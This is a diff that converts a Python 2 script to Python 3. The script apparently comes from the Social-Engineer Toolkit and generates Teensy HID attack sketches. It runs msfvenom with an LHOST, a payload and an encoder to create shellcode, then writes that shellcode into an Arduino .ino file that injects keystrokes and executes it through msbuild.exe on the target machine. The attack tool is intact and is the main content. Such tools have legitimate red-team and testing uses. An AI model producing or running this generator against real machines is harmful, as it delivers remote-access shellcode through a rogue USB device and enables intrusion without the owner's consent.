@@ -1,6 +1,12 @@
 #!/usr/bin/python
+from __future__ import print_function
 import os,subprocess,sys
 import teensy_gen
+
+try:
+    input = raw_input
+except NameError:
+    pass
 
 # Python script to automate the generation of ino files for the Teensy HID attack executing shellcode using msbuild.exe
 # This appears to be functional with my limited testing so if you know a better way please feel free to improve.
@@ -34,37 +40,37 @@ ino_tail_filename  = '/usr/share/set/src/teensy/ino_tail.txt'                   
 xml_input_filename = '/usr/share/set/src/teensy/ino_build_file.xml'                                   # File containing the xml build structure to be incorporated into the ino file.
 
 # User selection - default values
-print '\n-----default settings for shellcode generation-----\n'
-print 'LHOST                           - '+lhost_ipaddr
-print 'Shell Architecture              - '+shell_arch
-print 'Shell platform                  - '+shell_plat
-print 'Payload                         - '+payload
-print 'Encapsulation                   - '+encap
-print '\n-----default settings for C# XML file-----\n'
-print 'User variable for file location - '+enviro_var
-print 'XML Output filename             - '+xml_output_filename
-print 'Location of msbuild.exe         - '+build_path+'\n'
+print('\n-----default settings for shellcode generation-----\n')
+print('LHOST                           - '+lhost_ipaddr)
+print('Shell Architecture              - '+shell_arch)
+print('Shell platform                  - '+shell_plat)
+print('Payload                         - '+payload)
+print('Encapsulation                   - '+encap)
+print('\n-----default settings for C# XML file-----\n')
+print('User variable for file location - '+enviro_var)
+print('XML Output filename             - '+xml_output_filename)
+print('Location of msbuild.exe         - '+build_path+'\n')
 
 # User selection - Choices
-change_settings = raw_input("\nWould you like to change the default settings (y/n)")
-if ( change_settings == 'y' or change_settings == 'Y'):
-    lhost_ipaddr = teensy_gen.check_input(lhost_ipaddr, raw_input("\nPlease enter the new LHOST ip address - "))
-    shell_arch = teensy_gen.check_input(shell_arch, raw_input("Please enter the new shellcode architecture (choices) - "))
-    shell_plat = teensy_gen.check_input(shell_plat, raw_input("Please enter the new shellcode platform (choices) - "))
-    payload = teensy_gen.check_input(payload, raw_input("Please enter the new shellcode payload - "))
-    encap = teensy_gen.check_input(encap, raw_input("Please enter the new shellcode encpsulation - "))
-    enviro_var = teensy_gen.check_input(enviro_var, raw_input("Please enter the new environmental variable for the file location - "))
-    xml_output_filename = teensy_gen.check_input(xml_output_filename, raw_input("Please enter the new filename for the XML output file - "))
-    build_path = teensy_gen.check_input(build_path, raw_input("Please enter the new location of msbuild.exe - "))
+change_settings = input("\nWould you like to change the default settings (y/n)")
+if change_settings in ('y', 'Y'):
+    lhost_ipaddr = teensy_gen.check_input(lhost_ipaddr, input("\nPlease enter the new LHOST ip address - "))
+    shell_arch = teensy_gen.check_input(shell_arch, input("Please enter the new shellcode architecture (choices) - "))
+    shell_plat = teensy_gen.check_input(shell_plat, input("Please enter the new shellcode platform (choices) - "))
+    payload = teensy_gen.check_input(payload, input("Please enter the new shellcode payload - "))
+    encap = teensy_gen.check_input(encap, input("Please enter the new shellcode encpsulation - "))
+    enviro_var = teensy_gen.check_input(enviro_var, input("Please enter the new environmental variable for the file location - "))
+    xml_output_filename = teensy_gen.check_input(xml_output_filename, input("Please enter the new filename for the XML output file - "))
+    build_path = teensy_gen.check_input(build_path, input("Please enter the new location of msbuild.exe - "))
 else:
-    print '\n-----Using default settings-----\n'
+    print('\n-----Using default settings-----\n')
 
 # Main code
 
 with open(ino_output_filename,'wb') as ino_output_file:                     # Open the ino output file as a write to receive the formatted text.
     if os.path.isfile(ino_header_filename):
         with open(ino_header_filename,'rb') as ino_header_file:             # Open the ino header file as readonly.
-            print '-----Formatting ino header file-----'                    # Progress notification to the user.
+            print('-----Formatting ino header file-----')                    # Progress notification to the user.
             for ino_header_line in ino_header_file:                         # Read each line from the file.
                 ino_header_line = ino_header_line.rstrip()                  # Strip the formatting on the rhs of each line.
                 if ( ino_header_line == '-----create-----'):                # Check for the presence of the create label.
@@ -83,7 +89,7 @@ with open(ino_output_filename,'wb') as ino_output_file:                     # Op
 
     if os.path.isfile(xml_input_filename):
         with open(xml_input_filename,'rb') as xml_include_file:             # Open the XML file.
-            print '-----Formatting XML file for ino file-----'              # Progress notification to the user.
+            print('-----Formatting XML file for ino file-----')              # Progress notification to the user.
             for input_line in xml_include_file:                             # Read each line from the file.
                 input_line = input_line.rstrip()                            # Strip the formatting on the rhs of each line.
                 input_line = input_line.replace("\\", "\\\\")               # Escape the \ in each line using \\.
@@ -91,7 +97,7 @@ with open(ino_output_filename,'wb') as ino_output_file:                     # Op
 
                 if ( input_line == '-----shellcode-----'):                  # Check for the presence of the shellcode label.
                     # generate the shellcode using msfvenom
-                    print '-----Generating shellcode-----'                  # Progress notification to the user.
+                    print('-----Generating shellcode-----')                  # Progress notification to the user.
                     proc = subprocess.Popen("%smsfvenom -a %s --platform %s -p %s LHOST=%s -e %s -f %s -v shellcode" % (meta_path,shell_arch,shell_plat,payload,lhost_ipaddr,encap,shell_format), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
 
                     # read in the generated shellcode using stdout
@@ -99,13 +105,13 @@ with open(ino_output_filename,'wb') as ino_output_file:                     # Op
                     length = len(payload_shellcode)                         # assign the string length of the generated shellcode to the var length.
                     payload_shellcode = payload_shellcode.strip()           # Strip formatting from the payload.
 
-                    print '-----Formatting shellcode for ino file-----'     # Progress notification to the user.
+                    print('-----Formatting shellcode for ino file-----')     # Progress notification to the user.
                     ino_output_file.writelines( teensy_gen.ino_print_gen(payload_shellcode[0:34] ) + '\n' )  # format first line as shorter than rest.
 
                     while (start_pos <= length):                            # format the remaning lines of shellcode.
                         end_pos = start_pos + width                         # Set the position of end_pos.
                         if (end_pos >= (length - 3)):                       # Check if end position is greater than the length of the shellcode.
-                    	   end_pos = length                                 # set the end position for the last line.
+                            end_pos = length                                 # set the end position for the last line.
                         ino_output_file.writelines( teensy_gen.ino_print_gen(payload_shellcode[start_pos:end_pos] ) + '\n' ) # Print formatted shellcode section between start_pos and end_pos.
                         start_pos = end_pos + 1                             # move the start_pos to the next position from the end of the previous.
                 else:                                                       # If not the shellcode label.
@@ -118,7 +124,7 @@ with open(ino_output_filename,'wb') as ino_output_file:                     # Op
 
     if os.path.isfile(ino_tail_filename):
         with open(ino_tail_filename,'rb') as ino_tail_file:                 # Open the ino tail file.
-            print '-----Formatting ino tail file-----'                      # Progress notification to the user.
+            print('-----Formatting ino tail file-----')                      # Progress notification to the user.
             for ino_tail_line in ino_tail_file:                             # Read each line from the file.
                 ino_tail_line = ino_tail_line.rstrip()                      # Strip the formatting on the rhs of each line.
                 if ( ino_tail_line == '-----build-----'):                   # Check for the presence of the build label.
@@ -128,8 +134,8 @@ with open(ino_output_filename,'wb') as ino_output_file:                     # Op
 
         ino_tail_file.close()                                               # Close the ino tail file.
 
-        print '-----Finished creating ino file ino_file_gen.ino-----'       # Progress notification to the user.
-        user_return = raw_input("Please press any key")
+        print('-----Finished creating ino file ino_file_gen.ino-----')       # Progress notification to the user.
+        user_return = input("Please press any key")
     else:
         sys.exit('-----Exiting file - '+ino_tail_filename+' does not exist-----')
 
